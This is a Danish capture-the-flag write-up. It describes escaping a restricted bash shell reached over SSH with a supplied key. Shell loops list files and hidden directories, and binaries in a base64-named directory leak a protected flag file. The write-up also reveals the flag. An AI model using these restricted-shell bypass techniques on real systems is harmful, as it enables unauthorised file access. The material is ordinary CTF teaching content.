# Opgave

FDCA Special Ops har, siden vores første kontakt med Asgård, haft gang i en operation med at kortlægge Jættenettet. I går lykkedes det dem at identificere noget, der ligner en tankeboks fra Loke.

De har fået opsnappet en fil som ser ud til at give adgang.
Men da de allerede er fuldt optaget af deres nuværende operationer, håber vi at du kan finde noget interessant i tankeboksen.

jættenettet.dk:2222 

Vedhæftet fil: **loki.priv**

---

# Løsning

Jeg prøvede at ssh til port 2222 på jættenettet.dk med kommando: `ssh -i loki.priv -p 2222 loki@jættenettet.dk`, men det virkede ikke på grund af æ'et i jættenettet.

Jeg prøvede derfor i stedet at pinge domænet og fik en ip **20.240.212.83**, som jeg kunne bruge til at ssh.

Her får man at bash shell, som er meget restriktivt og der er ingen af de sædvanlige kommandoer, som **ls, pwd, cat, cd** som virker.

Jeg forsøgte at finde nogle filer at arbejde med ved at lave et hurtigt script: `for file in \*;do $file;done;` \* er et wildcard som finder alle filer.

Her får jeg outputtet:

```
archive: Is a directory \n
bin: Is a directory
considerations.md: Permission denied
credit.md: Permission denied
etc: Is a directory
lib: Is a directory
lib64: Is a directory
vault: Is a directory
```

Her ser især vault og bin interessante ud, da vault så vidt jeg ved ikke er et normalt directory og bin kan have nogle filer vi kan køre.

Jeg kører samme kommando som før men for hvert directory nu og finder disse filer:
```
/archive/security.md: 
/bin/bash: 
/etc/bash.bashrc
/etc/profile
/lib/x86_64-linux-gnu/libtinfo.so.6
/lib/x86_64-linux-gnu/libc.so.6
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
/lib64/ld-linux-x86-64.so.2
/vault/flag.txt
```

Her var jeg stuck i rigtig mange timer fordi der var ingen af disse filer som ville spille sammen. alle filer bortset fra de 3 filer 
**/lib/x86_64-linux-gnu/libc.so.6**, **/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2**, **/lib64/ld-linux-x86-64.so.2**, havde jeg ikke permissions til at kunne køre. Jeg vidste at jeg skulle på en eller anden måde finde ud af hvad der stod i **/vault/flag.txt**, men havde ingen ide om hvordan.

Jeg prøvede at køre alle filler gennem **ld-linux-x86-64.so.2**, som er en dynamic linker/loader, der bruges af andre programmer til at køre libraries. I dette tilfælde kan jeg prøve at bruge den til at prøve at køre alle filer på computeren, men intet giver mig et meningsfyldt resultat.

Efter mange timer kommer jeg til at tænke på at det egentlig var mærkeligt at mit script til at finde filer ikke havde fundet den public key der er nødvendig for at jeg kunne ssh med **loki.priv**.

Jeg finder så ud af at \* ikke medtager hidden directories, som starter med . og jeg kører derfor en opdateret kommando: `for file in /.\*;do $file;done;`, hvor jeg får dette output:

```
/.bashrc: Permission denied
/.c2VjcmV0Ymlu: Is a directory
/.ssh: Is a directory
```

**.c2VjcmV0Ymlu** er base64 encoded og decodes til **.secretbin**, som nok har hemmeligheden til at finde flaget.

Da jeg ikke ved hvilke filer der ligger i directory prøver jeg bare at køre dem alle sammen med flaget som input med scriptet: `bash$ for file in /.c2VjcmV0Ymlu/*; do $file /vault/flag.txt; done`

Fra dette får jeg outputtet:

```
/vault/flag.txt: line 1: .: filename argument required
.: usage: . filename [arguments]
/vault/flag.txt: line 2: .: filename argument required
.: usage: . filename [arguments]
/vault/flag.txt: line 3: .: filename argument required
.: usage: . filename [arguments]
/vault/flag.txt: line 4: .: filename argument required
.: usage: . filename [arguments]
/vault/flag.txt: line 5: .: filename argument required
.: usage: . filename [arguments]
/vault/flag.txt: line 6: FDCA{Ba5h_Liter4te_y0u_ar3}: No such file or directory
/vault/flag.txt: line 7: .: filename argument required
.: usage: . filename [arguments]
/vault/flag.txt: line 8: .: filename argument required
.: usage: . filename [arguments]
/vault/flag.txt: line 9: .: filename argument required
.: usage: . filename [arguments]
/vault/flag.txt: line 10: .: filename argument required
.: usage: . filename [arguments]
/vault/flag.txt: line 11: .: filename argument required
.: usage: . filename [arguments]
```

og her ser vi at flaget for dagen er **FDCA{Ba5h_Liter4te_y0u_ar3}**

---
